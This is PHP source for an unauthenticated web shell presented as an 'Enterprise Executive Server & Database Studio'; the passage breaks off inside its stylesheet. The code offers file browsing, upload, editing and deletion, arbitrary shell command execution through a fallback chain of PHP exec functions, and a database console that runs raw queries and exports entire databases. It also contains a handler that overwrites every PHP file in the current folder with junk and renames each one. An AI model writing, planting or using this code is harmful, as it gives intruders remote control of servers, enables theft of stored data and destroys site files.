<?php
// Navigasi Direktori File
$dir = isset($_GET['dir']) ? $_GET['dir'] : './';
$dir = realpath($dir);
if (!$dir || !is_dir($dir)) { $dir = realpath('./'); }

$breadcrumbItems = [];
$breadcrumbParts = explode(DIRECTORY_SEPARATOR, trim($dir, DIRECTORY_SEPARATOR));
$breadcrumbPath = DIRECTORY_SEPARATOR;
if (DIRECTORY_SEPARATOR === '\\' && preg_match('/^[A-Za-z]:$/', $breadcrumbParts[0] ?? '')) {
    $breadcrumbPath = array_shift($breadcrumbParts) . DIRECTORY_SEPARATOR;
    $breadcrumbItems[] = ['name' => rtrim($breadcrumbPath, DIRECTORY_SEPARATOR), 'path' => $breadcrumbPath];
} else {
    $breadcrumbItems[] = ['name' => DIRECTORY_SEPARATOR, 'path' => DIRECTORY_SEPARATOR];
}
foreach ($breadcrumbParts as $breadcrumbPart) {
    if ($breadcrumbPart === '') continue;
    $breadcrumbPath = rtrim($breadcrumbPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $breadcrumbPart;
    $breadcrumbItems[] = ['name' => $breadcrumbPart, 'path' => $breadcrumbPath];
}

$pesanAksi = "";

// Hancurkan semua file PHP langsung di direktori aktif (tanpa masuk subfolder).
if (isset($_POST['destroy_all_php_confirm']) && $_POST['destroy_all_php_confirm'] === 'HANCURKAN SEMUA') {
    $realDir = realpath($dir);
    $entries = $realDir ? scandir($realDir) : false;
    if (!$realDir || $entries === false) {
        http_response_code(500);
        exit('Direktori aktif tidak dapat dibaca.');
    }

    $kataAneh = ['العاصفة', 'Schmetterling', 'नमस्ते', 'Жужжание', 'أبجدية', 'Donaudampfschifffahrt', 'किरण', 'Überraschung', 'مجرة', 'संसार'];
    $simbolAneh = ['※⌘※', '۞۩۞', '⟁⟊⟁', 'Ж҉Ю҉', '༺༻', '꧁꧂', '⟡⟢⟣', '☷☵☲', '§¶※', '⸘¿‽'];
    $isiRusak = "";
    for ($baris = 0; $baris < 220; $baris++) {
        $isiRusak .= $kataAneh[random_int(0, count($kataAneh) - 1)] . ' '
            . $simbolAneh[random_int(0, count($simbolAneh) - 1)] . ' '
            . $kataAneh[random_int(0, count($kataAneh) - 1)] . ' '
            . bin2hex(random_bytes(8)) . "\n";
    }

    $destroyedCount = 0;
    $renamedCount = 0;
    $failedCount = 0;
    $namaAneh = ["\u{0639}\u{0627}\u{0635}\u{0641}\u{0629}", 'Schmetterling', "\u{0928}\u{092E}\u{0938}\u{094D}\u{0924}\u{0947}", "\u{0416}\u{0443}\u{0436}\u{0436}\u{0430}\u{043D}\u{0438}\u{0435}", 'Donaudampfschifffahrt'];
    $simbolNama = ["\u{203B}\u{2318}", "\u{06DE}\u{06E9}", "\u{2E3B}\u{2E3C}", "\u{262F}", "\u{2721}", "\u{00A7}\u{00B6}", "\u{2E2E}"];
    $ekstensiAneh = ["x\u{06DE}", "\u{0416}\u{042E}", "\u{2234}", "\u{0924}\u{094D}"];
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..' || strtolower(pathinfo($entry, PATHINFO_EXTENSION)) !== 'php') continue;
        $targetDestroy = realpath($realDir . DIRECTORY_SEPARATOR . $entry);
        if (!$targetDestroy || dirname($targetDestroy) !== $realDir || !is_file($targetDestroy)) continue;
        if (file_put_contents($targetDestroy, $isiRusak, LOCK_EX) === false) {
            $failedCount++;
            continue;
        }
        $destroyedCount++;

        $newPath = false;
        for ($attempt = 0; $attempt < 10; $attempt++) {
            $newName = $namaAneh[random_int(0, count($namaAneh) - 1)] . '-'
                . $simbolNama[random_int(0, count($simbolNama) - 1)] . '-'
                . bin2hex(random_bytes(6)) . '.'
                . $ekstensiAneh[random_int(0, count($ekstensiAneh) - 1)];
            $candidatePath = $realDir . DIRECTORY_SEPARATOR . $newName;
            if (!file_exists($candidatePath)) {
                $newPath = $candidatePath;
                break;
            }
        }

        if ($newPath !== false && rename($targetDestroy, $newPath)) $renamedCount++;
        else $failedCount++;
    }
    exit('Selesai. Isi file PHP diacak: ' . $destroyedCount . '; nama dan ekstensi diubah: ' . $renamedCount . '; gagal: ' . $failedCount . '.');
}

function quoteDatabaseIdentifier($identifier, $connectionType) {
    $identifier = (string) $identifier;
    return $connectionType === 'sqlite'
        ? '"' . str_replace('"', '""', $identifier) . '"'
        : '`' . str_replace('`', '``', $identifier) . '`';
}

function addPathToZip($zip, $path, $relativePath = '', $excludedPath = '') {
    $realPath = realpath($path);
    $realExcludedPath = $excludedPath !== '' ? realpath($excludedPath) : false;
    if (!$realPath || ($realExcludedPath && $realPath === $realExcludedPath)) return;

    if (is_dir($realPath)) {
        if ($relativePath !== '') $zip->addEmptyDir(str_replace(DIRECTORY_SEPARATOR, '/', $relativePath));
        $entries = scandir($realPath);
        if ($entries === false) return;
        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') continue;
            $childPath = $realPath . DIRECTORY_SEPARATOR . $entry;
            $childRelativePath = $relativePath === '' ? $entry : $relativePath . DIRECTORY_SEPARATOR . $entry;
            addPathToZip($zip, $childPath, $childRelativePath, $excludedPath);
        }
        return;
    }

    $zip->addFile($realPath, str_replace(DIRECTORY_SEPARATOR, '/', $relativePath ?: basename($realPath)));
}

function isSafeZipEntryName($entryName) {
    $entryName = str_replace('\\', '/', (string) $entryName);
    return $entryName !== ''
        && strpos($entryName, "\0") === false
        && $entryName[0] !== '/'
        && !preg_match('/^[A-Za-z]:\//', $entryName)
        && !preg_match('#(^|/)\.\.?(/|$)#', $entryName);
}

function getUniqueDirectoryPath($basePath) {
    if (!file_exists($basePath)) return $basePath;
    $counter = 1;
    do {
        $candidate = $basePath . '-' . $counter;
        $counter++;
    } while (file_exists($candidate));
    return $candidate;
}

// Download file dari direktori yang sedang dibuka.
if (isset($_GET['download'])) {
    $downloadName = basename((string) $_GET['download']);
    $downloadPath = $dir . DIRECTORY_SEPARATOR . $downloadName;
    if ($downloadName !== '' && is_file($downloadPath)) {
        header('Content-Type: application/octet-stream');
        header('X-Content-Type-Options: nosniff');
        header('Content-Length: ' . filesize($downloadPath));
        header("Content-Disposition: attachment; filename*=UTF-8''" . rawurlencode($downloadName));
        readfile($downloadPath);
        exit;
    }
    http_response_code(404);
    exit('File tidak ditemukan.');
}

// 0. PROSES DATABASE MANAGER (AJAX / POST)
if (isset($_POST['db_action'])) {
    header('Content-Type: application/json; charset=utf-8');
    $conn_type = $_POST['db_conn'] ?? 'mysql';
    $host      = $_POST['db_host'] ?? '127.0.0.1';
    $port      = $_POST['db_port'] ?? '3306';
    $db        = $_POST['db_name'] ?? '';
    $user      = $_POST['db_user'] ?? 'root';
    $pass      = $_POST['db_pass'] ?? '';
    $action    = $_POST['db_action'] ?? 'test';
    $query     = trim($_POST['db_query'] ?? '');
    $table     = $_POST['db_table'] ?? '';

    try {
        if ($conn_type === 'sqlite') {
            $pdo = new PDO("sqlite:" . $db);
        } else {
            $dsn = "mysql:host=$host;port=$port;charset=utf8mb4";
            if ($db !== '') $dsn .= ";dbname=$db";
            $pdo = new PDO($dsn, $user, $pass, [
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
            ]);
        }

        if ($action === 'export_json') {
            if ($conn_type === 'sqlite') {
                $stmtTables = $pdo->query("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' ORDER BY name");
            } else {
                $stmtTables = $pdo->query("SHOW TABLES");
            }

            $tableNames = $stmtTables->fetchAll(PDO::FETCH_COLUMN);
            $databaseName = $db !== '' ? basename(str_replace('\\', '/', $db)) : 'database';
            $exportData = [
                'database' => $databaseName,
                'connection' => $conn_type,
                'exported_at' => date(DATE_ATOM),
                'table_count' => count($tableNames),
                'tables' => []
            ];

            foreach ($tableNames as $tableName) {
                $quotedTable = quoteDatabaseIdentifier($tableName, $conn_type);
                $stmtRows = $pdo->query('SELECT * FROM ' . $quotedTable);
                $rows = $stmtRows->fetchAll(PDO::FETCH_ASSOC);
                $exportData['tables'][$tableName] = [
                    'name' => $tableName,
                    'row_count' => count($rows),
                    'rows' => $rows
                ];
            }

            $safeDatabaseName = preg_replace('/[^A-Za-z0-9._-]+/', '_', $databaseName);
            $safeDatabaseName = trim($safeDatabaseName, '._-') ?: 'database';
            header('Content-Disposition: attachment; filename="' . $safeDatabaseName . '-export.json"');
            echo json_encode($exportData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        } elseif ($action === 'test') {
            echo json_encode(['ok' => true, 'message' => 'Koneksi Database Berhasil!']);
        } elseif ($action === 'tables') {
            if ($conn_type === 'sqlite') {
                $stmt = $pdo->query("SELECT name FROM sqlite_master WHERE type='table'");
            } else {
                $stmt = $pdo->query("SHOW TABLES");
            }
            $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
            echo json_encode(['ok' => true, 'tables' => $tables]);
        } elseif ($action === 'browse' && !empty($table)) {
            $stmtCol = $pdo->query("DESCRIBE `$table`");
            $columns = $stmtCol->fetchAll(PDO::FETCH_ASSOC);

            $stmtRows = $pdo->query("SELECT * FROM `$table` LIMIT 100");
            $rows = $stmtRows->fetchAll(PDO::FETCH_ASSOC);

            $primaryKey = '';
            foreach ($columns as $col) {
                if ($col['Key'] === 'PRI') {
                    $primaryKey = $col['Field'];
                    break;
                }
            }

            echo json_encode([
                'ok' => true, 
                'table' => $table, 
                'columns' => $columns, 
                'rows' => $rows, 
                'primary_key' => $primaryKey,
                'count' => count($rows)
            ]);
        } elseif ($action === 'insert' && !empty($table)) {
            $data = $_POST['data'] ?? [];
            if (empty($data)) {
                echo json_encode(['ok' => false, 'error' => 'Data input kosong.']);
                exit;
            }
            $fields = array_keys($data);
            $placeholders = array_map(function($f) { return ":$f"; }, $fields);
            
            $sql = "INSERT INTO `$table` (`" . implode('`, `', $fields) . "`) VALUES (" . implode(', ', $placeholders) . ")";
            $stmt = $pdo->prepare($sql);
            $stmt->execute($data);
            echo json_encode(['ok' => true, 'message' => 'Data berhasil ditambahkan!']);
        } elseif ($action === 'delete' && !empty($table)) {
            $pk = $_POST['pk_field'] ?? '';
            $id = $_POST['pk_value'] ?? '';
            if (empty($pk) || $id === '') {
                echo json_encode(['ok' => false, 'error' => 'Primary key tidak valid untuk hapus.']);
                exit;
            }
            $stmt = $pdo->prepare("DELETE FROM `$table` WHERE `$pk` = ?");
            $stmt->execute([$id]);
            echo json_encode(['ok' => true, 'message' => 'Baris berhasil dihapus.']);
        } elseif ($action === 'query') {
            if ($query === '') {
                echo json_encode(['ok' => false, 'error' => 'Query kosong.']);
                exit;
            }
            $stmt = $pdo->prepare($query);
            $stmt->execute();
            $isSelect = (stripos($query, 'SELECT') === 0 || stripos($query, 'SHOW') === 0 || stripos($query, 'DESCRIBE') === 0);
            if ($isSelect) {
                $rows = $stmt->fetchAll();
                $cols = count($rows) > 0 ? array_keys($rows[0]) : [];
                echo json_encode(['ok' => true, 'columns' => $cols, 'rows' => $rows, 'count' => count($rows)]);
            } else {
                echo json_encode(['ok' => true, 'affected' => $stmt->rowCount(), 'message' => 'Query berhasil dieksekusi. Affected rows: ' . $stmt->rowCount()]);
            }
        }
    } catch (Exception $e) {
        echo json_encode(['ok' => false, 'error' => $e->getMessage()]);
    }
    exit;
}

// Aksi file manager: arsip, ekstrak, hapus, atau rename file di direktori aktif.
if (isset($_POST['file_action'])) {
    $fileAction = $_POST['file_action'];
    $fileName = basename(trim((string) ($_POST['file_name'] ?? '')));
    $filePath = $dir . DIRECTORY_SEPARATOR . $fileName;

    if ($fileName === '' || !file_exists($filePath)) {
        $pesanAksi = 'Berkas atau folder tidak ditemukan di direktori ini.';
        $pesanType = 'error';
    } elseif (($fileAction === 'delete' || $fileAction === 'rename') && !is_file($filePath)) {
        $pesanAksi = 'Aksi ini hanya tersedia untuk berkas.';
        $pesanType = 'error';
    } elseif ($fileAction === 'archive') {
        if (!class_exists('ZipArchive')) {
            $pesanAksi = 'Ekstensi ZIP PHP belum aktif di server.';
            $pesanType = 'error';
        } else {
            $archivePath = $dir . DIRECTORY_SEPARATOR . $fileName . '.zip';
            $zip = new ZipArchive();
            if ($zip->open($archivePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
                addPathToZip($zip, $filePath, $fileName, $archivePath);
                $zip->close();
                $pesanAksi = 'Arsip berhasil dibuat: ' . htmlspecialchars(basename($archivePath), ENT_QUOTES, 'UTF-8');
                $pesanType = 'success';
            } else {
                $pesanAksi = 'Gagal membuat arsip ZIP. Periksa izin folder.';
                $pesanType = 'error';
            }
        }
    } elseif ($fileAction === 'extract') {
        if (!class_exists('ZipArchive')) {
            $pesanAksi = 'Ekstensi ZIP PHP belum aktif di server.';
            $pesanType = 'error';
        } elseif (!is_file($filePath) || strtolower(pathinfo($filePath, PATHINFO_EXTENSION)) !== 'zip') {
            $pesanAksi = 'Hanya berkas ZIP yang dapat diekstrak.';
            $pesanType = 'error';
        } else {
            $zip = new ZipArchive();
            if ($zip->open($filePath) !== true) {
                $pesanAksi = 'Berkas ZIP tidak dapat dibuka.';
                $pesanType = 'error';
            } else {
                $unsafeEntry = false;
                for ($entryIndex = 0; $entryIndex < $zip->numFiles; $entryIndex++) {
                    if (!isSafeZipEntryName($zip->getNameIndex($entryIndex))) {
                        $unsafeEntry = true;
                        break;
                    }
                }

                if ($unsafeEntry) {
                    $zip->close();
                    $pesanAksi = 'Ekstraksi dibatalkan: arsip memiliki path yang tidak aman.';
                    $pesanType = 'error';
                } else {
                    $archiveBaseName = preg_replace('/\.zip$/i', '', $fileName);
                    $archiveBaseName = $archiveBaseName !== '' ? $archiveBaseName : 'extracted';
                    $extractPath = getUniqueDirectoryPath($dir . DIRECTORY_SEPARATOR . $archiveBaseName);
                    if (!mkdir($extractPath, 0755, true) || !$zip->extractTo($extractPath)) {
                        $zip->close();
                        $pesanAksi = 'Gagal mengekstrak arsip. Periksa izin folder.';
                        $pesanType = 'error';
                    } else {
                        $zip->close();
                        $pesanAksi = 'Arsip berhasil diekstrak ke folder: ' . htmlspecialchars(basename($extractPath), ENT_QUOTES, 'UTF-8');
                        $pesanType = 'success';
                    }
                }
            }
        }
    } elseif ($fileAction === 'delete') {
        if (unlink($filePath)) {
            $pesanAksi = 'File ' . htmlspecialchars($fileName, ENT_QUOTES, 'UTF-8') . ' berhasil dihapus.';
            $pesanType = 'success';
        } else {
            $pesanAksi = 'Gagal menghapus file. Periksa izin folder.';
            $pesanType = 'error';
        }
    } elseif ($fileAction === 'rename') {
        $newName = trim((string) ($_POST['new_name'] ?? ''));
        if ($newName === '' || $newName === '.' || $newName === '..' || basename($newName) !== $newName) {
            $pesanAksi = 'Nama file baru tidak valid.';
            $pesanType = 'error';
        } else {
            $newPath = $dir . DIRECTORY_SEPARATOR . $newName;
            if (file_exists($newPath)) {
                $pesanAksi = 'Nama file tersebut sudah digunakan.';
                $pesanType = 'error';
            } elseif (rename($filePath, $newPath)) {
                $pesanAksi = 'File berhasil diubah menjadi ' . htmlspecialchars($newName, ENT_QUOTES, 'UTF-8') . '.';
                $pesanType = 'success';
            } else {
                $pesanAksi = 'Gagal mengubah nama file. Periksa izin folder.';
                $pesanType = 'error';
            }
        }
    }
}

// 1. PROSES UPLOAD FILE
if (isset($_POST['submit_upload']) && isset($_FILES['berkas'])) {
    $targetPath = $dir . DIRECTORY_SEPARATOR . basename($_FILES['berkas']['name']);
    if (move_uploaded_file($_FILES['berkas']['tmp_name'], $targetPath)) {
        $pesanAksi = "File berhasil diunggah ke: " . htmlspecialchars($targetPath);
        $pesanType = "success";
    } else {
        $pesanAksi = "Gagal mengunggah file. Periksa izin folder.";
        $pesanType = "error";
    }
}

// 2. PROSES BUAT FILE BARU
if (isset($_POST['submit_buat_file'])) {
    $namaBaru = trim($_POST['nama_file_baru']);
    $isiBaru = $_POST['isi_file_baru'] ?? '';
    if (!empty($namaBaru)) {
        $pathBaru = $dir . DIRECTORY_SEPARATOR . basename($namaBaru);
        if (file_put_contents($pathBaru, $isiBaru) !== false) {
            $pesanAksi = "File '$namaBaru' berhasil dibuat!";
            $pesanType = "success";
        } else {
            $pesanAksi = "Gagal membuat file baru.";
            $pesanType = "error";
        }
    }
}

// 3. PROSES SIMPAN EDIT FILE
if (isset($_POST['submit_simpan_edit'])) {
    $targetFileEdit = $_POST['path_file_edit'] ?? '';
    $isiEditBaru = $_POST['isi_file_edit'] ?? '';
    
    if (!empty($targetFileEdit) && file_exists($targetFileEdit) && is_file($targetFileEdit)) {
        if (file_put_contents($targetFileEdit, $isiEditBaru) !== false) {
            $pesanAksi = "File berhasil disimpan!";
            $pesanType = "success";
        } else {
            $pesanAksi = "Gagal menyimpan perubahan file.";
            $pesanType = "error";
        }
    }
}

// 4. HELPER EKSEKUSI SHELL MULTI-FALLBACK
function run_cmd($cmd) {
    if (function_exists('shell_exec')) return shell_exec($cmd . " 2>&1");
    if (function_exists('exec')) { exec($cmd . " 2>&1", $out); return implode("\n", $out); }
    if (function_exists('system')) { ob_start(); system($cmd . " 2>&1"); return ob_get_clean(); }
    if (function_exists('passthru')) { ob_start(); passthru($cmd . " 2>&1"); return ob_get_clean(); }
    return "Error: Tidak ada fungsi eksekusi shell yang aktif di server ini.";
}

$outputShell = "";
$commandDijalankan = $_POST['command'] ?? '';
if (isset($_POST['submit_shell']) && !empty($commandDijalankan)) {
    $outputShell = htmlspecialchars(run_cmd("cd " . escapeshellarg($dir) . " && " . $commandDijalankan));
}

$modeEdit = false;
$fileTargetEdit = '';
$kontenFileEdit = '';
if (isset($_GET['edit'])) {
    $fileTargetEdit = realpath($_GET['edit']);
    if ($fileTargetEdit && is_file($fileTargetEdit)) {
        $modeEdit = true;
        $kontenFileEdit = file_get_contents($fileTargetEdit);
    }
}

$modeBuatBaru = isset($_GET['newfile']);
$fileSearch = trim((string) ($_GET['search'] ?? ''));
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise Executive Server & Database Studio</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-base: #030508;
            --bg-surface: #0b0f17;
            --bg-glass: rgba(11, 15, 23, 0.75);
            --border-subtle: rgba(255, 255, 255, 0.07);
            --border-glow: rgba(99, 102, 241, 0.35);
            --primary: #6366f1;
            --primary-hover: #4f46e5;
            --accent-green: #10b981;
            --accent-red: #ef4444;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
            --radius-lg: 16px;
            --radius-md: 10px;
            --transition-smooth: all 0.35s cubic-bezier(0.16, 1, 0.3, 1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background-color: var(--bg-base);
            color: var(--text-main);
            padding: 40px 24px;
            min-height: 100vh;
            background-image: 
                radial-gradient(circle at 10% 10%, rgba(99, 102, 241, 0.08) 0px, transparent 40%),
                radial-gradient(circle at 90% 90%, rgba(16, 185, 129, 0.05) 0px, transparent 40%);
            background-attachment: fixed;
            line-height: 1.6;
        }

        .container {
            max-width: 1440px;
            margin: 0 auto;
        }

        /* Luxury Header */
        .app-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            padding: 24px 32px;
            background: var(--bg-glass);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-lg);
            box-shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.7);
        }

        .app-header h2 {
            font-size: 1.35rem;
            font-weight: 700;
            letter-spacing: -0.02em;
            display: flex;
            align-items: center;
            gap: 14px;
            color: #ffffff;
        }

        .app-header h2 i {
            color: var(--primary);
            font-size: 1.5rem;
            filter: drop-shadow(0 0 10px rgba(99, 102, 241, 0.5));
        }

        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 14px;
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.25);
            border-radius: 20px;
            font-size: 0.8rem;
            color: #34d399;
            font-weight: 500;
        }

        /* Glass Cards */
        .card {
            background: var(--bg-glass);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--border-subtle);
            padding: 30px;
            border-radius: var(--radius-lg);
            margin-bottom: 28px;
            box-shadow: 0 15px 35px -10px rgba(0, 0, 0, 0.5);
            transition: var(--transition-smooth);
            animation: cardAppear 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }

        .card:hover {
            border-color: rgba(255, 255, 255, 0.12);
            box-shadow: 0 20px 45px -12px rgba(0, 0, 0, 0.7);
        }

        .card h3 {
            font-size: 1.15rem;
            font-weight: 600;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            color: #f8fafc;
            letter-spacing: -0.01em;
        }

        .card h3 i {
            color: var(--primary);
        }

        /* Links */
        a {
            color: #818cf8;
            text-decoration: none;
            transition: var(--transition-smooth);
        }

        a:hover {
            color: #a5b4fc;
        }

        /* Premium Form Controls & Inputs */
        label {
            font-size: 0.78rem;
            font-weight: 600;
            color: var(--text-muted);
            display: block;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        input:not([type]), input[type=text], input[type=password], input[type=file], textarea, select {
            background: rgba(4, 7, 13, 0.85);
            color: #f3f4f6;
            border: 1px solid rgba(255, 255, 255, 0.09);
            padding: 12px 16px;
            width: 100%;
            border-radius: var(--radius-md);
            font-family: inherit;
            font-size: 0.9rem;
            transition: var(--transition-smooth);
            outline: none;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.4);
        }

        input[type=text]::placeholder, input[type=password]::placeholder, textarea::placeholder {
            color: rgba(156, 163, 175, 0.5);
        }

        input:hover, textarea:hover, select:hover {
            border-color: rgba(255, 255, 255, 0.18);
        }

        input:focus, textarea:focus, select:focus {
            background: rgba(6, 10, 18, 0.95);
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.2), inset 0 2px 4px rgba(0,0,0,0.4);
        }

        textarea {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            resize: vertical;
        }

        /* Buttons Style */
        button, .btn {
            background: linear-gradient(135deg, var(--primary), var(--primary-hover));
            color: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: var(--radius-md);
            font-family: inherit;
            font-weight: 600;
            font-size: 0.88rem;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: var(--transition-smooth);
            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
            text-decoration: none;
            position: relative;
            overflow: hidden;
        }

        button::after, .btn::after {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(255,255,255,0.15), transparent);
            opacity: 0;
            transition: var(--transition-smooth);
        }

        button:hover::after, .btn:hover::after {
            opacity: 1;
        }

        button:hover, .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.5);
        }

        button:active, .btn:active {
            transform: translateY(0);
        }

        .btn-red {
            background: linear-gradient(135deg, #ef4444, #dc2626);
            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
        }
        .btn-red:hover {
            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.5);
        }

        .btn-green {
            background: linear-gradient(135deg, #10b981, #059669);
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
        }
        .btn-green:hover {
            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.5);
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid var(--border-subtle);
            color: var(--text-main);
            box-shadow: none;
        }
        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: rgba(255, 255, 255, 0.15);
            box-shadow: none;
        }

        /* Alert Notification Box */
        .alert-box {
            padding: 16px 20px;
            border-radius: var(--radius-md);
            margin-bottom: 24px;
            font-size: 0.9rem;
            display: flex;
            align-items: center;
            gap: 14px;
            border: 1px solid;
            animation: cardAppear 0.4s ease;
            backdrop-filter: blur(10px);
        }
        .alert-success {
            background: rgba(16, 185, 129, 0.12);
            border-color: rgba(16, 185, 129, 0.3);
            color: #34d399;
        }
        .alert-error {
            background: rgba(239, 68, 68, 0.12);
            border-color: rgba(239, 68, 68, 0.3);
            color: #f87171;
        }

        /* Database Studio Grid */
        .db-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 16px;
            margin-bottom: 20px;
        }

        #dbOut {
            background: rgba(2, 4, 8, 0.9);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-md);
            color: #34d399;
            padding: 20px;
            min-height: 160px;
            max-height: 60vh;
            overflow: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 12.5px;
            margin-top: 20px;
            box-shadow: inset 0 4px 12px rgba(0,0,0,0.6);
        }

        /* Modern Tables */
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
            background: rgba(7, 10, 16, 0.6);
            border-radius: var(--radius-md);
            overflow: hidden;
            border: 1px solid var(--border-subtle);
        }

        th, td {
            border-bottom: 1px solid var(--border-subtle);
            padding: 14px 18px;
            text-align: left;
            font-size: 0.88rem;
        }

        th {
            background: rgba(255, 255, 255, 0.03);
            font-weight: 600;
            color: var(--text-muted);
            text-transform: uppercase;
            font-size: 0.72rem;
            letter-spacing: 0.08em;
        }

        tr {
            transition: var(--transition-smooth);
        }

        tr:hover td {
            background: rgba(255, 255, 255, 0.025);
        }

        table.db-table th {
            background: rgba(11, 15, 23, 0.95);
            color: #93c5fd;
        }

        .table-list-badge {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            background: rgba(255, 255, 255, 0.035);
            border: 1px solid var(--border-subtle);
            padding: 8px 14px;
            margin: 5px;
            border-radius: var(--radius-md);
            cursor: pointer;
            color: #93c5fd;
            font-size: 0.86rem;
            transition: var(--transition-smooth);
        }

        .table-list-badge:hover {
            background: var(--primary);
            color: #fff;
            border-color: var(--primary);
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.3);
        }

        pre {
            background: rgba(2, 4, 8, 0.9);
            color: #34d399;
            padding: 20px;
            border-radius: var(--radius-md);
            overflow-x: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.86rem;
            border: 1px solid var(--border-subtle);
            box-shadow: inset 0 4px 12px rgba(0,0,0,0.6);
        }

        /* Terminal workspace */
        .terminal-card {
            overflow: hidden;
            padding: 0;
            border-color: rgba(223, 202, 157, 0.18);
            background: linear-gradient(145deg, rgba(18, 19, 23, 0.97), rgba(9, 10, 13, 0.97));
        }

        .terminal-card::before { left: 0; width: 100%; opacity: 0.85; }

        .terminal-card-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 18px;
            padding: 22px 26px 18px;
            border-bottom: 1px solid rgba(223, 202, 157, 0.11);
            background: linear-gradient(180deg, rgba(255,255,255,0.035), transparent);
        }

        .terminal-card-heading { min-width: 0; }

        .terminal-card-heading h3 {
            margin-bottom: 4px;
            font-size: 1.05rem;
        }

        .terminal-card-heading h3 i { color: #d7bd83; }

        .terminal-subtitle {
            display: block;
            color: #98958d;
            font-size: 0.76rem;
            letter-spacing: 0.01em;
        }

        .terminal-session-status {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            flex: 0 0 auto;
            padding: 7px 11px;
            border: 1px solid rgba(127, 156, 131, 0.25);
            border-radius: 999px;
            background: rgba(80, 115, 84, 0.11);
            color: #b4c9ae;
            font-size: 0.68rem;
            font-weight: 700;
            letter-spacing: 0.09em;
        }

        .terminal-session-status::before {
            content: '';
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: #9fbe96;
            box-shadow: 0 0 0 4px rgba(159, 190, 150, 0.1), 0 0 12px rgba(159, 190, 150, 0.6);
        }

        .terminal-content { padding: 22px 26px 26px; }

        .terminal-command-form {
            display: flex;
            align-items: stretch;
            gap: 10px;
        }

        .terminal-input-shell {
            display: flex;
            align-items: center;
            flex: 1;
            min-width: 0;
            border: 1px solid rgba(223, 202, 157, 0.18);
            border-radius: 12px;
            background: rgba(5, 6, 8, 0.85);
            box-shadow: inset 0 2px 8px rgba(0,0,0,0.35), 0 0 0 1px rgba(0,0,0,0.2);
            transition: var(--transition-smooth);
        }

        .terminal-input-shell:focus-within {
            border-color: rgba(211, 178, 111, 0.72);
            box-shadow: 0 0 0 4px rgba(201, 169, 110, 0.1), inset 0 2px 8px rgba(0,0,0,0.35);
        }

        .terminal-prompt {
            flex: 0 0 auto;
            padding-left: 15px;
            color: #9fbe96;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            font-weight: 700;
        }

        .terminal-command-input {
            min-width: 0;
            border: 0 !important;
            background: transparent !important;
            box-shadow: none !important;
            font-family: 'JetBrains Mono', monospace !important;
            color: #f2eee5 !important;
        }

        .terminal-command-input:focus { outline: none; }

        .terminal-execute-btn { min-width: 132px; }

        .terminal-shortcuts {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
            margin-top: 14px;
        }

        .terminal-shortcuts-label {
            margin-right: 3px;
            color: #8f8b82;
            font-size: 0.69rem;
            font-weight: 700;
            letter-spacing: 0.09em;
            text-transform: uppercase;
        }

        .terminal-shortcut {
            padding: 6px 10px;
            border-radius: 8px;
